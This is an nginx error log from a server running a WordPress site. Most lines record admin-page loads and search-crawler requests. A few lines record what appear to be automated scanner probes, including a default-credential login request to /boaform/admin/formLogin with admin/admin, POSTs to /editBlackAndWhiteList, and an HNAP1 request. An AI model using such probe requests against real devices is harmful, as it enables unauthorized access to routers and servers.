+2022/06/01 15:53:07 [error] 23#23: *39 "/usr/share/nginx/html/paihangbang/2022/06/01/hello-world/index.php" is not found (2: No such file or directory), client: 159.75.219.167, server: localhost, request: "GET /paihangbang/2022/06/01/hello-world/ HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/2022/06/01/hello-world/"
+2022/06/01 15:53:07 [error] 23#23: *40 "/usr/share/nginx/html/paihangbang/index.php/2022/06/01/hello-world/index.php" is not found (20: Not a directory), client: 159.75.219.167, server: localhost, request: "GET /paihangbang/index.php/2022/06/01/hello-world/ HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/index.php/2022/06/01/hello-world/"
+2022/06/01 15:53:33 [warn] 23#23: *36 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/1/00/0000000001 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/ HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-login.php"
+2022/06/01 15:53:33 [warn] 23#23: *51 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/2/00/0000000002 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/"
+2022/06/01 15:53:33 [warn] 23#23: *53 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/3/00/0000000003 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/"
+2022/06/01 15:54:05 [error] 23#23: *66 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 202.164.137.119, server: localhost, request: "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0"
+2022/06/01 15:54:16 [warn] 23#23: *57 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/4/00/0000000004 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-scripts.php?c=1&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/themes.php"
+2022/06/01 15:54:16 [warn] 23#23: *53 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/5/00/0000000005 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/themes.php"
+2022/06/01 15:56:34 [warn] 23#23: *95 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/6/00/0000000006 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,buttons,media-views,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menu&load%5Bchunk_1%5D=s,wp-pointer,widgets,site-icon,l10n,wp-auth-check&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/upload.php"
+2022/06/01 15:56:34 [warn] 23#23: *96 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/7/00/0000000007 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-scripts.php?c=1&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils,moxiejs,plupload&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/upload.php"
+2022/06/01 15:57:03 [error] 23#23: *105 directory index of "/usr/share/nginx/html/" is forbidden, client: 111.7.100.25, server: localhost, request: "GET / HTTP/1.1", host: "www.dgphb.com"
+2022/06/01 15:58:01 [warn] 23#23: *121 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/8/00/0000000008 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/update-core.php"
+2022/06/01 15:58:21 [warn] 23#23: *121 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/9/00/0000000009 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/index.php"
+2022/06/01 16:08:41 [error] 23#23: *160 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.60, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1301.dgphb.com"
+2022/06/01 16:08:41 [error] 23#23: *161 directory index of "/usr/share/nginx/html/" is forbidden, client: 66.249.79.60, server: localhost, request: "GET / HTTP/1.1", host: "m.1301.dgphb.com"
+2022/06/01 16:09:30 [error] 23#23: *158 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-login.php?redirect_to=http%3A%2F%2F159.75.219.167%2Fwp-admin%2F&reauth=1 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167"
+2022/06/01 16:10:21 [error] 23#23: *158 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.46.202.171, server: localhost, request: "POST /paihangbang/wp-login.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167//wp-login.php?redirect_to=http%3A%2F%2F159.75.219.167%2Fwp-admin%2F&reauth=1"
+2022/06/01 16:10:58 [error] 23#23: *158 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 183.46.202.171, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-login.php"
+2022/06/01 16:11:02 [error] 23#23: *173 "/usr/share/nginx/html/wp-admin/index.php" is not found (2: No such file or directory), client: 183.46.202.171, server: localhost, request: "GET /wp-admin/ HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167//wp-login.php?redirect_to=http%3A%2F%2F159.75.219.167%2Fwp-admin%2F&reauth=1"
+2022/06/01 16:11:18 [warn] 23#23: *173 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/0/01/0000000010 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /paihangbang/wp-admin/ HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167"
+2022/06/01 16:11:43 [error] 23#23: *173 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: failed to open stream: No such file or directory in Unknown on line 0Unable to open primary script: /usr/share/nginx/html/wp-login.php (No such file or directory)" while reading response header from upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-login.php?redirect_to=http%3A%2F%2F159.75.219.167%2Fpaihangbang%2Fwp-admin%2Foptions-general.php%3Fsettings-updated%3Dtrue&reauth=1 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/options-general.php"
+2022/06/01 16:14:37 [warn] 23#23: *195 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/1/01/0000000011 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-scripts.php?c=1&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/"
+2022/06/01 16:14:37 [warn] 23#23: *197 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/2/01/0000000012 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/"
+2022/06/01 16:14:49 [warn] 23#23: *200 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/3/01/0000000013 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-auth-check&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/themes.php"
+2022/06/01 16:15:14 [warn] 23#23: *197 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/4/01/0000000014 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/customize.php?theme=twentytwentyone&return=http%3A%2F%2F159.75.219.167%2Fwp-admin%2Fthemes.php%3Ftheme%3Dtwentytwentyone HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/themes.php?theme=twentytwentyone"
+2022/06/01 16:15:15 [warn] 23#23: *200 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/5/01/0000000015 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets,site-icon&load%5Bchunk_1%5D=,l10n,buttons,customize-controls,customize-widgets,wp-block-library,wp-block-library-theme,wp-components,wp-widgets,wp-block-edi&load%5Bchunk_2%5D=tor,wp-nux,wp-reusable-blocks,wp-editor,wp-reset-editor-styles,wp-editor-classic-layout-styles,wp-edit-blocks,wp-customize-widge&load%5Bchunk_3%5D=ts,wp-block-directory,wp-format-library,customize-nav-menus,media-views,code-editor,wp-color-picker&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/customize.php?theme=twentytwentyone&return=http%3A%2F%2F159.75.219.167%2Fwp-admin%2Fthemes.php%3Ftheme%3Dtwentytwentyone"
+2022/06/01 16:15:15 [warn] 23#23: *198 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/6/01/0000000016 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-scripts.php?c=1&load%5Bchunk_0%5D=jquery-core,jquery-migrate,regenerator-runtime,wp-polyfill,wp-hooks,underscore,customize-base,wp-dom-ready&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/customize.php?theme=twentytwentyone&return=http%3A%2F%2F159.75.219.167%2Fwp-admin%2Fthemes.php%3Ftheme%3Dtwentytwentyone"
+2022/06/01 16:16:09 [error] 23#23: *210 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.145, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8447.dgphb.com"
+2022/06/01 16:23:38 [error] 23#23: *231 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.183, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.225948.dgphb.com"
+2022/06/01 16:38:49 [error] 23#23: *247 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.221, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "76125.dgphb.com"
+2022/06/01 16:52:51 [error] 23#23: *274 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.227, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "60001.dgphb.com"
+2022/06/01 16:52:51 [error] 23#23: *275 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.19, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.40078.dgphb.com"
+2022/06/01 16:52:53 [error] 23#23: *280 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.77, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.92010.dgphb.com"
+2022/06/01 17:07:39 [error] 23#23: *283 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.9, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.7309.dgphb.com"
+2022/06/01 17:08:49 [error] 23#23: *286 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.204, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.60391.dgphb.com"
+2022/06/01 17:20:07 [error] 23#23: *291 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.235, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.72946.dgphb.com"
+2022/06/01 17:37:51 [error] 23#23: *303 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.125, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.62195.dgphb.com"
+2022/06/01 17:56:05 [error] 23#23: *308 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.5, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "274037.dgphb.com"
+2022/06/01 17:56:05 [error] 23#23: *309 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.142, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.55206.dgphb.com"
+2022/06/01 18:06:52 [error] 23#23: *317 open() "/usr/share/nginx/html/seas.htm" failed (2: No such file or directory), client: 81.71.60.110, server: localhost, request: "GET /seas.htm HTTP/1.1", host: "159.75.219.167"
+2022/06/01 18:08:49 [error] 23#23: *318 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.200, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "36358.dgphb.com"
+2022/06/01 18:39:51 [warn] 23#23: *346 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/7/01/0000000017 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-scripts.php?c=1&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils,zxcvbn-async&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/profile.php"
+2022/06/01 18:42:56 [warn] 23#23: *371 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/8/01/0000000018 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,code-editor,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/theme-editor.php"
+2022/06/01 18:42:56 [warn] 23#23: *373 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/9/01/0000000019 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-scripts.php?c=1&load%5Bchunk_0%5D=jquery-core,jquery-migrate,hoverIntent,utils,regenerator-runtime,wp-polyfill,wp-hooks&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/theme-editor.php"
+2022/06/01 18:44:17 [warn] 23#23: *373 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/0/02/0000000020 while reading upstream, client: 183.46.202.171, server: localhost, request: "GET /wp-admin/load-styles.php?c=1&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons&ver=6.0 HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/update-core.php"
+2022/06/01 18:47:50 [error] 23#23: *417 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.30, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.54721.dgphb.com"
+2022/06/01 18:48:59 [warn] 23#23: *427 an upstream response is buffered to a temporary file /var/cache/nginx/fastcgi_temp/1/02/0000000021 while reading upstream, client: 183.46.202.171, server: localhost, request: "POST /wp-admin/admin-ajax.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/wp-admin/theme-install.php?search=cate"
+2022/06/01 19:08:49 [error] 23#23: *438 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.50, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "5961.dgphb.com"
+2022/06/01 19:32:50 [error] 23#23: *445 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.187, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1883.dgphb.com"
+2022/06/01 20:08:50 [error] 23#23: *451 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.43, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.8570.dgphb.com"
+2022/06/01 20:31:20 [error] 23#23: *454 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.25, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.28118.dgphb.com"
+2022/06/01 20:32:04 [error] 23#23: *455 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 103.161.17.72, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "159.75.219.167:80", referrer: "http://159.75.219.167:80/admin/login.asp"
+2022/06/01 20:53:51 [error] 23#23: *470 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.56, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "42470.dgphb.com"
+2022/06/01 21:16:20 [error] 23#23: *480 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.7, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "vecy.dgphb.com"
+2022/06/01 21:38:50 [error] 23#23: *489 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.177, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.670.dgphb.com"
+2022/06/01 21:52:14 [error] 23#23: *494 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.27, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.161237.dgphb.com"
+2022/06/01 22:05:38 [error] 23#23: *505 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.121, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.638.dgphb.com"
+2022/06/01 22:14:20 [error] 23#23: *515 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.73.212.116, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/"
+2022/06/01 22:15:37 [error] 23#23: *527 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.73.212.116, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/?cat=1"
+2022/06/01 22:32:28 [error] 23#23: *533 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.71, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.35213.dgphb.com"
+2022/06/01 22:33:17 [error] 23#23: *536 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.224, server: localhost, request: "GET /paihangbang/wp-admin/tools.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/users.php"
+2022/06/01 22:34:46 [error] 23#23: *538 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.221, server: localhost, request: "GET /paihangbang/wp-admin/themes.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/"
+2022/06/01 22:35:16 [error] 23#23: *541 open() "/usr/share/nginx/html/paihangbang/wp-includes/images/spinner.gif" failed (2: No such file or directory), client: 1.14.174.210, server: localhost, request: "GET /paihangbang/wp-includes/images/spinner.gif HTTP/1.1", host: "159.75.219.167"
+2022/06/01 22:35:18 [error] 23#23: *542 open() "/usr/share/nginx/html/paihangbang/wp-admin/images/spinner.gif" failed (2: No such file or directory), client: 113.96.221.194, server: localhost, request: "GET /paihangbang/wp-admin/images/spinner.gif HTTP/1.1", host: "159.75.219.167"
+2022/06/01 22:37:53 [error] 23#23: *543 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.93, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3893.dgphb.com"
+2022/06/01 22:45:43 [error] 23#23: *546 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.75, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.99177.dgphb.com"
+2022/06/01 22:59:08 [error] 23#23: *549 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.81, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.69585.dgphb.com"
+2022/06/01 23:12:20 [error] 23#23: *552 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.140, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "c6crr.dgphb.com"
+2022/06/01 23:25:36 [error] 23#23: *561 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.22, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.83923.dgphb.com"
+2022/06/01 23:38:51 [error] 23#23: *564 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.32, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6438.dgphb.com"
+2022/06/01 23:55:11 [error] 23#23: *567 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 27.7.143.218, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "167.219.75.159:81"
+2022/06/02 01:45:07 [error] 23#23: *584 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 124.106.92.226, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:88"
+2022/06/02 01:56:30 [error] 23#23: *585 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.88, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.950.dgphb.com"
+2022/06/02 02:20:37 [error] 23#23: *594 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.212, server: localhost, request: "GET /paihangbang/wp-admin/install.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/readme.html"
+2022/06/02 02:41:30 [error] 23#23: *606 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.244, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "1044.dgphb.com"
+2022/06/02 02:42:45 [error] 23#23: *621 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 103.213.96.233, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167"
+2022/06/02 03:22:27 [error] 23#23: *629 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.221, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "95699.dgphb.com"
+2022/06/02 03:37:27 [error] 23#23: *636 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.38, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "99599.dgphb.com"
+2022/06/02 03:52:27 [error] 23#23: *639 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.9, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "7460.dgphb.com"
+2022/06/02 04:38:31 [error] 23#23: *655 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.71, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "14824.dgphb.com"
+2022/06/02 04:43:42 [error] 23#23: *658 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.146, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.58337.dgphb.com"
+2022/06/02 05:43:42 [error] 23#23: *680 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.99, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "10900.dgphb.com"
+2022/06/02 05:45:49 [error] 23#23: *685 open() "/usr/share/nginx/html/50x.html" failed (2: No such file or directory), client: 81.71.60.222, server: localhost, request: "GET /50x.html HTTP/1.1", host: "159.75.219.167"
+2022/06/02 06:18:32 [error] 23#23: *692 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.182, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.8493.dgphb.com"
+2022/06/02 06:27:18 [error] 23#23: *695 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 81.71.60.220, server: localhost, request: "GET /paihangbang/wp-admin/admin-ajax.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/paihangbang/wp-admin/upload.php"
+2022/06/02 06:29:20 [error] 23#23: *697 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 210.95.107.217, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:81"
+2022/06/02 06:30:18 [error] 23#23: *709 "/usr/share/nginx/html/english/index.php" is not found (2: No such file or directory), client: 42.48.79.153, server: localhost, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
+2022/06/02 06:38:18 [error] 23#23: *720 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 106.75.100.66, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167"
+2022/06/02 06:52:10 [error] 23#23: *722 open() "/usr/share/nginx/html/paihangbang/wp-content/themes/twentytwentytwo/assets/images/flight-path-on-transparent-d.png" failed (2: No such file or directory), client: 175.27.65.224, server: localhost, request: "GET /paihangbang/wp-content/themes/twentytwentytwo/assets/images/flight-path-on-transparent-d.png HTTP/1.1", host: "159.75.219.167"
+2022/06/02 06:56:32 [error] 23#23: *723 "/usr/share/nginx/html/HNAP1/index.php" is not found (2: No such file or directory), client: 81.71.60.220, server: localhost, request: "GET /HNAP1/ HTTP/1.1", host: "159.75.219.167:80"
+2022/06/02 07:06:40 [error] 23#23: *728 open() "/usr/share/nginx/html/paihangbang/wp-content/themes/twentytwentytwo/screenshot.png" failed (2: No such file or directory), client: 112.60.22.36, server: localhost, request: "GET /paihangbang/wp-content/themes/twentytwentytwo/screenshot.png?ver=1.2 HTTP/1.1", host: "159.75.219.167"
+2022/06/02 07:06:40 [error] 23#23: *729 open() "/usr/share/nginx/html/paihangbang/wp-content/themes/twentytwentytwo/screenshot.png" failed (2: No such file or directory), client: 118.126.124.204, server: localhost, request: "GET /paihangbang/wp-content/themes/twentytwentytwo/screenshot.png?ver=1.2 HTTP/1.1", host: "159.75.219.167"
